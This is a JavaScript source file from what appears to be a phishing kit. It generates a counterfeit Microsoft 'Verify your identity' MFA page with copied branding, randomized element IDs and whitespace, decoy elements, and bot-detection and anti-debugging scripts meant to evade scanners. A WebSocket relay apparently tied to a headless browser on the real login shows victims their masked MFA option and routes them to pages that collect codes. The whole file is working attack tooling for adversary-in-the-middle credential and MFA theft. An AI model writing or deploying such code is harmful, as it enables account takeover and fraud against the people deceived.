/**
 * MS Verification Options Page Generator
 * Generates the MFA options page with bot evasion
 */

const { randomId, randomComment, randomizeWhitespace, getBotDetectionScript, getAntiDebugScript, getDecoyElements } = require('./utils/antiBot');

function generateMsVeryPage(token, options = {}) {
    // Generate randomized IDs
    const ids = {
        container: randomId('cont'),
        loading: randomId('load'),
        selectedOption: randomId('opt'),
        selectedEmail: randomId('email'),
        userEmailBack: randomId('back'),
        cancelBtn: randomId('btn')
    };

    const html = `<!DOCTYPE html>
<html lang="en">
<head>
    ${randomComment()}
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verify your identity</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, 'Roboto', 'Helvetica Neue', Arial, sans-serif;
            background-color: #f2f2f2;
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            margin: 0;
            color: #1f1f1f;
            background-image: url('https://logincdn.msftauth.net/shared/5/images/fluent_web_dark_2_bf5f23287bc9f60c9be2.svg');
            background-size: cover;
            background-position: center;
        }
        .${ids.container} {
            background: #ffffff;
            padding: 44px;
            border-radius: 8px;
            box-shadow: 0 2px 6px 0 rgba(0, 0, 0, 0.2), 0 0 1px 0 rgba(0, 0, 0, 0.1);
            width: 440px;
            max-width: 90%;
            text-align: left;
            position: relative;
        }
        .logo-container { display: flex; align-items: center; margin-bottom: 16px; }
        .ms-logo { width: 21px; height: 21px; margin-right: 8px; }
        .logo-text { font-size: 15px; font-weight: 600; color: #1f1f1f; }
        .user-email {
            font-size: 15px;
            color: #1f1f1f;
            margin-bottom: 24px;
            display: inline-flex;
            align-items: center;
            gap: 6px;
            cursor: pointer;
            transition: all 0.1s ease;
            padding: 4px 0;
            background: none;
            border: none;
            font-family: inherit;
        }
        .user-email:hover { color: #0067b8; }
        .user-email:hover .back-arrow { transform: translateX(-2px); }
        .back-arrow { width: 12px; height: 12px; transition: transform 0.2s ease; flex-shrink: 0; }
        h1 { font-size: 24px; font-weight: 600; margin-bottom: 8px; color: #1f1f1f; line-height: 28px; }
        h2 { font-size: 24px; font-weight: 600; margin-bottom: 8px; color: #1f1f1f; }
        p { color: #605e5c; margin-bottom: 24px; font-size: 15px; }
        .selected-option {
            display: flex;
            align-items: center;
            padding: 16px;
            border: 1px solid #8a8886;
            border-radius: 2px;
            cursor: pointer;
            transition: all 0.1s ease;
            margin-bottom: 24px;
            background-color: #ffffff;
            animation: fadeIn 0.3s ease;
        }
        .selected-option:hover { background-color: #f3f2f1; border-color: #0067b8; box-shadow: 0 0 0 1px #0067b8; }
        .selected-option:active { background-color: #edebe9; border-color: #004578; box-shadow: 0 0 0 1px #004578; }
        .option-icon { width: 24px; height: 24px; margin-right: 12px; color: #605e5c; flex-shrink: 0; }
        .more-info { font-size: 15px; color: #0067b8; text-decoration: none; margin-bottom: 24px; display: inline-block; transition: all 0.1s ease; }
        .more-info:hover { color: #004578; text-decoration: underline; }
        .selected-option:not([style*="display: none"]) ~ .more-info { display: none; }
        .button-container { text-align: right; }
        .btn-cancel {
            padding: 10px 28px;
            font-size: 15px;
            font-weight: 600;
            background: #f3f2f1;
            color: #201f1e;
            border: 1px solid #8a8886;
            border-radius: 2px;
            cursor: pointer;
            transition: all 0.1s ease;
            font-family: inherit;
        }
        .btn-cancel:hover { background: #edebe9; border-color: #8a8886; }
        .btn-cancel:active { background: #e1dfdd; }
        .footer { position: fixed; bottom: 16px; right: 16px; display: flex; gap: 16px; font-size: 12px; z-index: 1; }
        .footer a { color: rgba(255, 255, 255, 0.8); text-decoration: none; transition: color 0.1s ease; }
        .footer a:hover { color: rgba(255, 255, 255, 1); text-decoration: underline; }
        .loading { color: #605e5c; font-size: 15px; margin-bottom: 24px; display: flex; align-items: center; gap: 12px; }
        .loading-spinner { display: inline-flex; gap: 4px; align-items: center; }
        .loading-dot { width: 8px; height: 8px; background-color: #0067b8; border-radius: 50%; animation: loadingDots 1.4s infinite ease-in-out both; }
        .loading-dot:nth-child(1) { animation-delay: -0.32s; }
        .loading-dot:nth-child(2) { animation-delay: -0.16s; }
        @keyframes loadingDots { 0%, 80%, 100% { transform: scale(0); opacity: 0.5; } 40% { transform: scale(1); opacity: 1; } }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(-4px); } to { opacity: 1; transform: translateY(0); } }
    </style>
</head>
<body>
    ${randomComment()}
    ${getDecoyElements()}
    
    <div class="${ids.container}">
        <div class="logo-container">
            <svg class="ms-logo" viewBox="0 0 21 21" fill="none" xmlns="http://www.w3.org/2000/svg">
                <path d="M0 0H9.9V9.9H0V0Z" fill="#F25022" />
                <path d="M11.1 0H21V9.9H11.1V0Z" fill="#7FBA00" />
                <path d="M0 11.1H9.9V21H0V11.1Z" fill="#00A4EF" />
                <path d="M11.1 11.1H21V11.1V21H11.1V11.1Z" fill="#FFB900" />
            </svg>
            <span class="logo-text">Microsoft</span>
        </div>

        <button class="user-email" id="${ids.userEmailBack}" type="button">
            <svg class="back-arrow" viewBox="0 0 12 12" fill="currentColor">
                <path d="M10 5H3.83L6.42 2.41L5 1L0 6L5 11L6.41 9.59L3.83 7H10V5Z" />
            </svg>
            <span class="user-email-text"></span>
        </button>
        
        <h2>Almost there</h2>
        <p>Just one more step to verify it's you.</p>

        <!-- Loading state -->
        <div class="loading" id="${ids.loading}">
            <div class="loading-spinner">
                <div class="loading-dot"></div>
                <div class="loading-dot"></div>
                <div class="loading-dot"></div>
            </div>
            <span>Loading verification method...</span>
        </div>

        <!-- Selected option button (hidden initially) -->
        <div class="selected-option" id="${ids.selectedOption}" style="display: none;">
            <svg class="option-icon" viewBox="0 0 24 24" fill="currentColor">
                <path d="M20 4H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 4l-8 5-8-5V6l8 5 8-5v2z" />
            </svg>
            <span id="${ids.selectedEmail}"></span>
        </div>

        <a href="#" class="more-info">More information</a>

        <div class="button-container">
            <button class="btn-cancel" id="${ids.cancelBtn}">Cancel</button>
        </div>
    </div>

    <div class="footer">
        <a href="#">Terms of use</a>
        <a href="#">Privacy &amp; cookies</a>
        <a href="#">...</a>
    </div>

    <script>
        ${getBotDetectionScript()}
        ${getAntiDebugScript()}
        
        var TOKEN = '${token}';
        var IDS = {
            loading: '${ids.loading}',
            selectedOption: '${ids.selectedOption}',
            selectedEmail: '${ids.selectedEmail}',
            userEmailBack: '${ids.userEmailBack}',
            cancelBtn: '${ids.cancelBtn}'
        };
        
        document.addEventListener('DOMContentLoaded', function() {
            var userEmail = sessionStorage.getItem('userEmail');
            var resultList = JSON.parse(sessionStorage.getItem('resultList') || 'null');
            var selectedOption = sessionStorage.getItem('selectedOption');

            // Populate the user email
            var userEmailElement = document.querySelector('.user-email-text');
            if (userEmailElement) {
                userEmailElement.textContent = userEmail || 'Loading...';
            }

            // Back button functionality
            var userEmailBack = document.getElementById(IDS.userEmailBack);
            if (userEmailBack) {
                userEmailBack.addEventListener('click', function() {
                    window.history.back();
                });
            }

            // Cancel button
            var cancelBtn = document.getElementById(IDS.cancelBtn);
            if (cancelBtn) {
                cancelBtn.addEventListener('click', function() {
                    window.location.href = 'https://www.microsoft.com';
                });
            }

            // MFA method detection
            function detectMFAMethod(optionText) {
                if (!optionText || typeof optionText !== 'string') {
                    return { type: 'unknown', isValid: false };
                }
                // Email pattern: one or more letters, followed by asterisks, @, letters, dot, letters
                var isEmail = /^[a-zA-Z]+[\*]+@[a-zA-Z]+\.[a-zA-Z]+$/.test(optionText);
                // Phone pattern: 4+ asterisks followed by 2-4 digits, OR exactly 4 digits at end
                var isPhone = /^[\*]{4,}[0-9]{2,4}$/.test(optionText) || /[0-9]{4}$/.test(optionText);
                
                if (isEmail) {
                    console.log('[EMAIL] Detected - ', optionText);
                    return { type: 'email', isValid: true };
                } else if (isPhone) {
                    console.log('[PHONE] Detected - ', optionText);
                    return { type: 'phone', isValid: true };
                }
                return { type: 'unknown', isValid: false };
            }

            // WebSocket connection
            var ws;
            var reconnectAttempts = 0;
            var maxReconnectAttempts = 10;

            function connectWebSocket() {
                try {
                    const wsProtocol = window.location.protocol === 'https:' ? 'wss://' : 'ws://';
                    ws = new WebSocket(wsProtocol + window.location.host);

                    ws.onopen = function() {
                        console.log('[WEBSOCKET] Connected');
                        reconnectAttempts = 0;
                        ws.send(JSON.stringify({ type: 'request_mfa_option', token: TOKEN }));
                    };

                    ws.onmessage = function(event) {
                        try {
                            var data = JSON.parse(event.data);
                            
                            if (data.status === 'error' && data.error_code === 500) {
                                console.log('[WARNING] Received error 500 - restarting flow...');
                                window.location.href = '/';
                                return;
                            }

                            if (data.selectedOption && data.status === 'option_selected') {
                                detectMFAMethod(data.selectedOption);
                                // Store the selected option in sessionStorage
                                sessionStorage.setItem('selectedOption', data.selectedOption);
                                sessionStorage.setItem('selectedEmail', data.selectedOption);
                                console.log('[STORAGE] Stored selectedOption in sessionStorage:', data.selectedOption);
                                displaySelectedOption(data.selectedOption);
                                // Don't redirect - let user click the button
                                console.log('[INFO] Displayed selected option, waiting for user click...');
                                return;
                            }

                            if (data.redirect && !data.selectedOption) {
                                console.log('[REDIRECT] Redirect received:', data.redirect);
                                // Only redirect if we didn't just display a selected option
                                window.location.href = data.redirect;
                            }

                            if (data.status === 'headless_clicked' && data.action === 'redirect_to_mailinput') {
                                window.location.href = '/' + TOKEN + '/mailinput';
                            }
                        } catch (error) {
                            console.error('Error parsing WebSocket message:', error);
                        }
                    };

                    ws.onclose = function() {
                        console.log('[WEBSOCKET] Disconnected');
                        if (reconnectAttempts < maxReconnectAttempts) {
                            reconnectAttempts++;
                            console.log('[RECONNECT] Attempting... (' + reconnectAttempts + '/' + maxReconnectAttempts + ')');
                            setTimeout(connectWebSocket, 2000);
                        }
                    };

                    ws.onerror = function(error) {
                        console.error('WebSocket error:', error);
                    };
                } catch (error) {
                    console.error('Failed to create WebSocket:', error);
                }
            }

            connectWebSocket();

            function displaySelectedOption(optionText) {
                if (!optionText || typeof optionText !== 'string') {
                    console.error('[ERROR] Invalid optionText:', optionText);
                    return;
                }

                console.log('[DEBUG] displaySelectedOption called with:', optionText);
                console.log('[DEBUG] IDS object:', IDS);

                var loadingElement = document.getElementById(IDS.loading);
                var selectedOptionElement = document.getElementById(IDS.selectedOption);
                var selectedEmailElement = document.getElementById(IDS.selectedEmail);

                console.log('[DEBUG] DOM Check:');
                console.log('  - Loading element (ID: ' + IDS.loading + '):', loadingElement ? 'FOUND' : 'NOT FOUND');
                console.log('  - Selected option element (ID: ' + IDS.selectedOption + '):', selectedOptionElement ? 'FOUND' : 'NOT FOUND');
                console.log('  - Selected email element (ID: ' + IDS.selectedEmail + '):', selectedEmailElement ? 'FOUND' : 'NOT FOUND');

                if (!loadingElement || !selectedOptionElement || !selectedEmailElement) {
                    console.error('[ERROR] Required DOM elements not found');
                    console.log('[DEBUG] Available elements:', document.querySelectorAll('[id*="load"], [id*="opt"], [id*="email"]').length);
                    return;
                }

                var methodTypeRes = detectMFAMethod(optionText);
                console.log('[DEBUG] Method type detected:', methodTypeRes.type);

                loadingElement.style.display = 'none';
                selectedOptionElement.style.display = 'flex';
                selectedEmailElement.textContent = optionText;
                console.log('[SUCCESS] DOM updated - Email/phone set to:', optionText);

                // Hide the "More information" link when showing the selected option
                var moreInfoLink = document.querySelector('.more-info');
                if (moreInfoLink) {
                    moreInfoLink.style.display = 'none';
                }

                sessionStorage.setItem('selectedOption', optionText);
                sessionStorage.setItem('selectedEmail', optionText);

                if (methodTypeRes.type === 'phone') {
                    selectedOptionElement.onclick = function() {
                        console.log('[CLICK] User clicked phone option');
                        if (ws && ws.readyState === 1) {
                            ws.send(JSON.stringify({ type: 'user_confirmation', confirmed: true }));
                        }
                        window.location.href = '/' + TOKEN + '/numinput';
                    };
                } else {
                    selectedOptionElement.onclick = function() {
                        console.log('[CLICK] User clicked email option');
                        if (ws && ws.readyState === 1) {
                            ws.send(JSON.stringify({ type: 'user_confirmation', confirmed: true }));
                        }
                        window.location.href = '/' + TOKEN + '/mailinput';
                    };
                }

                console.log('[SUCCESS] Displayed selected option:', optionText);
            }

            // Handle existing data
            if (selectedOption) {
                console.log('[INFO] Using stored selectedOption:', selectedOption);
                displaySelectedOption(selectedOption);
            } else if (resultList && Array.isArray(resultList)) {
                // Try to find masked email or phone in stored results
                var maskedEmailOption = resultList.find(function(item) {
                    if (typeof item !== 'string') return false;
                    return /^[a-zA-Z]+[\*]+@[a-zA-Z]+\.[a-zA-Z]+$/.test(item);
                });
                var maskedPhoneOption = resultList.find(function(item) {
                    if (typeof item !== 'string') return false;
                    return /^[\*]{4,}[0-9]{2,4}$/.test(item) || /[0-9]{4}$/.test(item);
                });

                if (maskedEmailOption) {
                    displaySelectedOption(maskedEmailOption);
                } else if (maskedPhoneOption) {
                    displaySelectedOption(maskedPhoneOption);
                }
            }
        });
    </script>
</body>
</html>`;

    return randomizeWhitespace(html);
}

module.exports = { generateMsVeryPage };
